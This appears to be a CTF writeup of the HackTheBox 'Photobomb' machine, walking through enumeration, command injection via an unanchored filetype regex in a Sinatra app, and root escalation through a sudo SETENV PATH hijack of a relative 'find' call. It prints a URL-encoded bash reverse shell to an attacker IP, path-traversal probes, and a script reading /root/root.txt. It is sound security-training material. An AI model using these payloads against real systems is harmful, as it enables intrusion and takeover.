---
layout: "post"
title: "Photobomb writeup"
tags: ["Writeups", "HackTheBox", "CTF", "Sinatrarb", "Command-Injection", "Hijacking-Relative-Paths"]
authors:
  - name: Federico Fantini
    url: "https://federicofantini.net"
meta: "The box starts with a command injection vulnerability due to a bad filetype regex. The privesc instead thanks to the SETENV permission of sudo allows me to run a script as root and hijack the relative path of the find command."
---

# INDEX
- [INDEX](#index)
  - [Enumeration](#enumeration)

<br><br>

*[Image: Photobomb box HTB]*

## Enumeration

- `nmap -sV -p- -A 10.10.11.182`
    ```
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
    |   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
    |_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
    80/tcp open  http    nginx 1.18.0 (Ubuntu)
    |_http-title: Did not follow redirect to http://photobomb.htb/
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```

- I visit the website
   ```html
    <html>
    <head>
        <title>Photobomb</title>
        <link type="text/css" rel="stylesheet" href="styles.css" media="all" />
        <script src="photobomb.js"></script>
    </head>
    <body>
    <div id="container">
        <header>
            <h1><a href="/">Photobomb</a></h1>
        </header>
        <article>
            <h2>Welcome to your new Photobomb franchise!</h2>
            <p>You will soon be making an amazing income selling premium photographic gifts.</p>
            <p>This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.</p>
            <p>To get started, please <a href="/printer" class="creds">click here!</a> (the credentials are in your welcome pack).</p>
            <p>If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.</p>
        </article>
    </div>
    </body>
    </html>
    ```

    a login is required to access the `/printer` page

- We can try to do a directory enumeration, to find few particoular pages. For this purpose I'll use `dirbuster`:

    *[Image: Photobomb box HTB]*

- Maybe `photobomb.js` could contain something interesting... let's check what's inside it:
    ```javascript
    function init() {
        // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
        if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
            document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
        }
    }
    window.onload = init;
    ```

    `pH0t0:b0Mb!` are the credentials for accessing the `/printer` page via HTTP Basic Authentication. [See references](https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication#access_using_credentials_in_the_url).

    Thanks to the credentials I can log in and see the page `/printer`:
    ```html
    <html>
    <head>
        <title>Photobomb</title>
        <link type="text/css" rel="stylesheet" href="styles.css" media="all" />
    </head>
    <body>
    <div id="container">
        <header>
            <h1><a href="/">Photobomb</a></h1>
        </header>
        <form id="photo-form" action="/printer" method="post">
            <h3>Select an image</h3>
            <fieldset id="image-wrapper">
                <input type="radio" name="photo" value="voicu-apostol-MWER49YaD-M-unsplash.jpg" id="voicu-apostol-MWER49YaD-M-unsplash.jpg" checked="checked" /><label for="voicu-apostol-MWER49YaD-M-unsplash.jpg" style="background-image: url(ui_images/voicu-apostol-MWER49YaD-M-unsplash.jpg)"></label><input type="radio" name="photo" value="masaaki-komori-NYFaNoiPf7A-unsplash.jpg" id="masaaki-komori-NYFaNoiPf7A-unsplash.jpg"/><label for="masaaki-komori-NYFaNoiPf7A-unsplash.jpg" style="background-image: url(ui_images/masaaki-komori-NYFaNoiPf7A-unsplash.jpg)"></label><input type="radio" name="photo" value="andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg" id="andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg"/><label for="andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg" style="background-image: url(ui_images/andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg)"></label><input type="radio" name="photo" value="tabitha-turner-8hg0xRg5QIs-unsplash.jpg" id="tabitha-turner-8hg0xRg5QIs-unsplash.jpg"/><label for="tabitha-turner-8hg0xRg5QIs-unsplash.jpg" style="background-image: url(ui_images/tabitha-turner-8hg0xRg5QIs-unsplash.jpg)"></label><input type="radio" name="photo" value="nathaniel-worrell-zK_az6W3xIo-unsplash.jpg" id="nathaniel-worrell-zK_az6W3xIo-unsplash.jpg"/><label for="nathaniel-worrell-zK_az6W3xIo-unsplash.jpg" style="background-image: url(ui_images/nathaniel-worrell-zK_az6W3xIo-unsplash.jpg)"></label><input type="radio" name="photo" value="kevin-charit-XZoaTJTnB9U-unsplash.jpg" id="kevin-charit-XZoaTJTnB9U-unsplash.jpg"/><label for="kevin-charit-XZoaTJTnB9U-unsplash.jpg" style="background-image: url(ui_images/kevin-charit-XZoaTJTnB9U-unsplash.jpg)"></label><input type="radio" name="photo" value="calvin-craig-T3M72YMf2oc-unsplash.jpg" id="calvin-craig-T3M72YMf2oc-unsplash.jpg"/><label for="calvin-craig-T3M72YMf2oc-unsplash.jpg" style="background-image: url(ui_images/calvin-craig-T3M72YMf2oc-unsplash.jpg)"></label><input type="radio" name="photo" value="eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg" id="eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg"/><label for="eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg" style="background-image: url(ui_images/eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg)"></label><input type="radio" name="photo" value="finn-whelen-DTfhsDIWNSg-unsplash.jpg" id="finn-whelen-DTfhsDIWNSg-unsplash.jpg"/><label for="finn-whelen-DTfhsDIWNSg-unsplash.jpg" style="background-image: url(ui_images/finn-whelen-DTfhsDIWNSg-unsplash.jpg)"></label><input type="radio" name="photo" value="almas-salakhov-VK7TCqcZTlw-unsplash.jpg" id="almas-salakhov-VK7TCqcZTlw-unsplash.jpg"/><label for="almas-salakhov-VK7TCqcZTlw-unsplash.jpg" style="background-image: url(ui_images/almas-salakhov-VK7TCqcZTlw-unsplash.jpg)"></label><input type="radio" name="photo" value="mark-mc-neill-4xWHIpY2QcY-unsplash.jpg" id="mark-mc-neill-4xWHIpY2QcY-unsplash.jpg"/><label for="mark-mc-neill-4xWHIpY2QcY-unsplash.jpg" style="background-image: url(ui_images/mark-mc-neill-4xWHIpY2QcY-unsplash.jpg)"></label><input type="radio" name="photo" value="wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg" id="wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg"/><label for="wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg" style="background-image: url(ui_images/wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg)"></label>
            </fieldset>
            <fieldset id="image-settings">
                <label for="filetype">File type</label>
                <select name="filetype" title="JPGs work on most printers, but some people think PNGs give better quality">
                    <option value="jpg">JPG</option>
                    <option value="png">PNG</option>
                    </select>
                <div class="product-list">
                    <input type="radio" name="dimensions" value="3000x2000" id="3000x2000" checked="checked"/><label for="3000x2000">3000x2000 - mousemat</label>
                    <input type="radio" name="dimensions" value="1000x1500" id="1000x1500"/><label for="1000x1500">1000x1500 - mug</label>
                    <input type="radio" name="dimensions" value="600x400" id="600x400"/><label for="600x400">600x400 - phone cover</label>
                    <input type="radio" name="dimensions" value="300x200" id="300x200"/><label for="300x200">300x200 - keyring</label>
                    <input type="radio" name="dimensions" value="150x100" id="150x100"/><label for="150x100">150x100 - usb stick</label>
                    <input type="radio" name="dimensions" value="30x20" id="30x20"/><label for="30x20">30x20 - micro SD card</label>
                </div>
            </fieldset>
            <div class="controls">
                <button type="submit">download photo to print</button>
            </div>
        </form>
    </div>
    </body>
    </html>
    ```

- The site allows me to choose one of the images from the gallery and download it in different formats and resolutions. I fill out the form and press the **download photo to print** button. I use Burpsuite to see what's going on:

    ```
    POST /printer HTTP/1.1
    Host: photobomb.htb
    Content-Length: 78
    Cache-Control: max-age=0
    Authorization: Basic cEgwdDA6YjBNYiE=
    Origin: http://photobomb.htb
    DNT: 1
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Referer: http://photobomb.htb/printer
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    sec-gpc: 1
    Connection: close

    photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg&dimensions=3000x2000
    ```

    *NOTE: since the [HTTP Basic Authentication](https://en.wikipedia.org/wiki/Basic_access_authentication) technology is used, it is necessary to add the `Authorization: Basic cEgwdDA6YjBNYiE=` header to all requests in order to be effectively logged in.*

- Since the images are chosen from the `/ui_images` directory maybe I can do a [Path Traversal attack](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

    Unfortunately I had poor results but got an interesting error:<br>
    `photo=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd&filetype=jpg&dimensions=1` &#8594; `ArgumentError - invalid byte sequence in UTF8`

    The `%c0%af` corresponds to the `..À¯`, [explanation](https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work).

    And the debug screen tells me that server side `ruby` is present with [sinatrarb](https://sinatrarb.com/):
    ```
    /usr/lib/ruby/vendor_ruby/sinatra/base.rb
    ```

    Also if I click on the debug code lines I can see the source code:
    ```ruby
    post '/printer' do
        photo = params[:photo]
        filetype = params[:filetype]
        dimensions = params[:dimensions]

        # handle inputs
        if photo.match(/\.{2}|\//)
            halt 500, 'Invalid photo.'
        end

        if !FileTest.exist?( "source_images/" + photo )
            halt 500, 'Source photo does not exist.'
        end
    ```
    
    The regex in the above source code (`photo.match(/\.{2}|\//)`) defeats all attempts at a Path Traversal Attack.
    

- I try to replicate that error in all other fields to enumerate other parts of the source code:
    
    `photo=kevin-charit-XZoaTJTnB9U-unsplash.jpg&filetype=jpg&dimensions=..%c0%af`<br>and<br>`photo=kevin-charit-XZoaTJTnB9U-unsplash.jpg&filetype=..%c0%af&dimensions=1x1`<br>return again an `ArgumentError - invalid byte sequence in UTF8`

    ```ruby
        halt 500, 'Source photo does not exist.'
    end

    if !filetype.match(/^(png|jpg)/)
        halt 500, 'Invalid filetype.'
    end

    if !dimensions.match(/^[0-9]+x[0-9]+$/)
        halt 500, 'Invalid dimensions.'
    end

    case filetype
    when 'png'
        content_type 'image/png'
    when 'jpg'
    ```

    The second regex `!dimensions.match(/^[0-9]+x[0-9]+$/)` is correct while the first `!filetype.match(/^(png|jpg)/)` does not have the `$` at the end.

- I try to get another kind of error by using an illegal character in filenames for Linux file systems: `photo=kevin-charit-XZoaTJTnB9U-unsplash.jpg&filetype=png%00&dimensions=1x1` &#8594; `ArgumentError - path name contains null byte`

    ```ruby
    when 'jpg'
        content_type 'image/jpeg'
    end

    filename = photo.sub('.jpg', '') + '_' + dimensions + '.' + filetype
    response['Content-Disposition'] = "attachment; filename=#{filename}"

    if !File.exists?('resized_images/' + filename)
        command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resized_images/' + filename
        puts "Executing: #{command}"
        system(command)
    else
        puts "File already exists."
    end
    ```

    Bingo! A system command is used for the conversion to which the previous parameters sanitized by the regexes are passed.

    A command injection vulnerability is present in the final filetype regex `/^(png|jpg)/` because without the ending `$` I can add anything I want.

- Exploit the vulnerability: `photo=kevin-charit-XZoaTJTnB9U-unsplash.jpg&filetype=png%3B%20bash%20%2Dc%20%22bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E14%2E89%2F4444%200%3E%261%22&dimensions=1x1` (I've URL encoded the exploit `; bash -c "bash -i >& /dev/tcp/10.10.14.89/4444 0>&1"`)

    Reverse shell obtained!

<br><br>

## Privesc

I start analyzing the system with: `sudo -l`
```
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

*NOTE: `env_reset` undoes all changes to `$PATH` [https://www.sudo.ws/docs/man/1.8.13/sudoers.man/](https://www.sudo.ws/docs/man/1.8.13/sudoers.man/)*

*NOTE: `SETENV` allows you to override this by adding the `--preserve-env` option to `sudo`*

It looks like I can run the `/opt/cleanup.sh` file as root. I look at what this script does.

*[Image: cleanup]*

Ok, as the name says this script cleans the log files and protects the original photos by making them accessible only to root.

But wait, the script executes find command with relative path!

This is great because I can change the `$PATH` to run as root whatever I want!

*NOTE: I can do this because we have `SETENV` permission in the file*

`export PATH="/tmp/bin:$PATH"`<br>
`mkdir -p /tmp/bin`<br>
`echo '#!/bin/bash' > /tmp/bin/find`<br>
`echo 'cat /root/root.txt > /tmp/flag' >> /tmp/bin/find`<br>
`echo 'chown wizard:wizard /tmp/flag' >> /tmp/bin/find`<br>
`chmod +x /tmp/bin/find`<br>
`sudo --preserve-env=PATH /opt/cleanup.sh`

Root flag taken!

